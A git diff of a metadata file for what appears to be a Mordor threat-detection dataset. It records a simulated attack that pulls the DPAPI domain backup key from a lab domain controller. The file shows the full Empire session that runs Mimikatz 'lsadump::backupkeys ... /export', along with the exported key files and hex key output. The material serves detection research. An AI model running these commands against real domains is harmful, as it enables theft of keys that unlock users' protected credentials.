@@ -1,14 +1,14 @@
-title: Empire Mimikatz Export Master Key
+title: Empire Mimikatz Backup Keys
 id: SDWIN-190518235535
 author: Roberto Rodriguez @Cyb3rWard0g
 creation_date: 2019/05/18
-modification_date: 2019/05/18
+modification_date: 2020/09/21
 platform: Windows
-description: This dataset represents adversaries using tools like Mimikatz to export the master key from the domain controller remotely.
-dataset:
-  - type: Host
-    link:
-      - https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/credential_access/host/empire_mimikatz_export_master_key.tar.gz
+tags:
+  - DPAPI
+  - DPAPI Domain Backup key
+  - RPC LSARPC
+description: This dataset represents adversaries retrieving the DPAPI Domain Backup Key from the DC via RPC LSARPC methods over SMB.
 attack_mappings:
   - technique: T1003
     sub-technique:
@@ -18,62 +18,75 @@ notebooks:
   - project: Threat Hunter Playbook
     name: Domain DPAPI Backup Key Extraction
     link: https://threathunterplaybook.com/notebooks/windows/06_credential_access/credential_access/WIN-190620024610.html
-  - project: Threat Hunter Playbook
-    name: win_dpapi_domain_backupkey_extraction
-    link: https://github.com/OTRF/ThreatHunter-Playbook/tree/master/signatures/sigma/win_dpapi_domain_backupkey_extraction.yml
-  - project: Threat Hunter Playbook
-    name: win_protected_storage_service_access
-    link: https://github.com/OTRF/ThreatHunter-Playbook/tree/master/signatures/sigma/win_protected_storage_service_access.yml
-  - project: Threat Hunter Playbook
-    name: win_dpapi_domain_masterkey_backup_attempt
-    link: https://github.com/OTRF/ThreatHunter-Playbook/tree/master/signatures/sigma/win_dpapi_domain_masterkey_backup_attempt.yml  
-simulator:
+files:
+- type: Host
+  link: https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/credential_access/host/empire_mimikatz_backupkeys_dcerpc_smb_lsarpc.zip
+- type: Network
+  link: https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/credential_access/network/empire_mimikatz_backupkeys_dcerpc_smb_lsarpc.zip
+simulation:
   environment: Mordor shire
   tools:
     - type: C2
       name: Empire
-      module: credentials
+      module: mimikatz_lsadump_backupkeys
       script: https://github.com/OTRF/Blacksmith/blob/master/aws/mordor/cfn-files/scripts/Invoke-Mimikatz.ps1
   permissions_required:
     - Domain Admin
   adversary_view: |-
-    (Empire: powershell/credentials/mimikatz/command) > set Command lsadump::backupkeys /system:HFDC01.shire.com /export
-    (Empire: powershell/credentials/mimikatz/command) > execute
-    [*] Tasked 13GK9C5T to run TASK_CMD_JOB
-    [*] Agent 13GK9C5T tasked with task ID 1
-    [*] Tasked agent 13GK9C5T to run module powershell/credentials/mimikatz/command
-    (Empire: powershell/credentials/mimikatz/command) > Job started: DPB5F4
-    Hostname: HR001.shire.com / S-1-5-21-2511471446-1103646877-3980648787
+    (Empire: GCSKD17Z) > agents
 
-      .#####.   mimikatz 2.1.1 (x64) #17763 Feb 23 2019 12:03:02
-    .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
+    [*] Active agents:
+
+    Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener
+    ----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------
+    GCSKD17Z ps 172.18.39.5     WORKSTATION5      *THESHIRE\pgustavo      powershell         1112   5/0.0    2020-09-22 06:44:20  http            
+
+    (Empire: agents) > interact GCSKD17Z
+    (Empire: GCSKD17Z) > usemodule credentials/mimikatz/command
+    (Empire: powershell/credentials/mimikatz/command) > set Command lsadump::backupkeys /system:MORDORDC.theshire.local /export
+    (Empire: powershell/credentials/mimikatz/command) > execute
+    [*] Tasked GCSKD17Z to run TASK_CMD_JOB
+    [*] Agent GCSKD17Z tasked with task ID 9
+    [*] Tasked agent GCSKD17Z to run module powershell/credentials/mimikatz/command
+    (Empire: powershell/credentials/mimikatz/command) > 
+    Job started: WY91NL
+
+    Hostname: WORKSTATION5.theshire.local / S-1-5-21-4228717743-1032521047-1810997296
+
+      .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2020 20:07:46
+    .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
     ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
     ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
     '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
       '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
 
-    mimikatz(powershell) # lsadump::backupkeys /system:HFDC01.shire.com /export
+    mimikatz(powershell) # lsadump::backupkeys /system:MORDORDC.theshire.local /export
 
-    Current prefered key:       {a1b58ded-16ec-4822-ab1c-3a4cfb9c268a}
+    Current prefered key:       {b7638eb2-c641-40da-ac1c-f79d705bbc34}
       * RSA key
-      Exportable key : YES
-      Key size       : 2048
-      Private export : OK - 'ntds_capi_0_a1b58ded-16ec-4822-ab1c-3a4cfb9c268a.pvk'
-      PFX container  : OK - 'ntds_capi_0_a1b58ded-16ec-4822-ab1c-3a4cfb9c268a.pfx'
-      Export         : OK - 'ntds_capi_0_a1b58ded-16ec-4822-ab1c-3a4cfb9c268a.der'
+            |Provider name : Microsoft Strong Cryptographic Provider
+            |Unique name   : 
+            |Implementation: CRYPT_IMPL_SOFTWARE ; 
+            Algorithm      : CALG_RSA_KEYX
+            Key size       : 2048 (0x00000800)
+            Key permissions: 0000003f ( CRYPT_ENCRYPT ; CRYPT_DECRYPT ; CRYPT_EXPORT ; CRYPT_READ ; CRYPT_WRITE ; CRYPT_MAC ; )
+            Exportable key : YES
+            Private export : OK - 'ntds_capi_0_b7638eb2-c641-40da-ac1c-f79d705bbc34.keyx.rsa.pvk'
+            PFX container  : OK - 'ntds_capi_0_b7638eb2-c641-40da-ac1c-f79d705bbc34.pfx'
+            Export         : OK - 'ntds_capi_0_b7638eb2-c641-40da-ac1c-f79d705bbc34.der'
 
-    Compatibility prefered key: {116228fd-901d-4386-853a-9611c3c93e28}
+    Compatibility prefered key: {74562e44-6689-4ede-9c63-1fc80a4efb16}
       * Legacy key
-    aff6c7adc1e0ddc685fae1fd657a1f6756df313f9b149f4af78949700de1022f
-    e921157be464fc5cd40ceec73694e565bcab123780f285a5cd678af40cf5f0bb
-    ec9e6b981966d12e5a7de25073fbb716a0e435d1dfee8c55bf5725172161f9d3
-    06f4e00ffa1bc37de63719a7e5173ce20b69dc2764664535435aab7afbc1d332
-    f0c7837839ab891efcb6dc9490746d35aab45efc5e72a7270186ae0260d1ad0f
-    28e5cbe391c9df45dd38e7e5681df55a216a2d50e4de0d8cdd33dde8806569ee
-    fe3e906081c4d1c18e4f42461133a2646fce2a37773ea15bbaae5fef01c0997e
-    f19dcfaf5582ab001056b8fe921c5f5c896f145fef1dfeda8ebe9ef4fd4fccdb
+    62120aa3174a8809ca95bd9369e8d5d062783e1c851c4cb4e9fd30db992a2a74
+    7be846fe31ba50f4595afab3b487697dfaeec151652b27ea2fec86ac89903680
+    1bacbf6392c94c986714efc09bbdd09b9bd0b4dfb8ccfb9a8eb946d8dbeb58d9
+    38244dc055bd85b32b47fdc180baca8f69d8944b5ae000f2353a0f5ef96e0797
+    4525d57e27895e40d495ab0956f3349a066069681943b426854e885393ddc871
+    2d9a9d21f60f2929bdf0bf52131291dad835c512a537b98b2738483203c96334
+    b79fc1f61ff6a92761eaee2a44f915f2514d8974e30ce8ef0d8f40038bbfd1b5
+    1c89035623e2a66c9858ffcade5a3300f2fbc5678da7ae9011c328304e4f440d
 
-      Export         : OK - 'ntds_legacy_0_116228fd-901d-4386-853a-9611c3c93e28.key'
+            Export         : OK - 'ntds_legacy_0_74562e44-6689-4ede-9c63-1fc80a4efb16.key'
 
-    (Empire: powershell/credentials/mimikatz/command) >
+    (Empire: powershell/credentials/mimikatz/command) > 
 references:
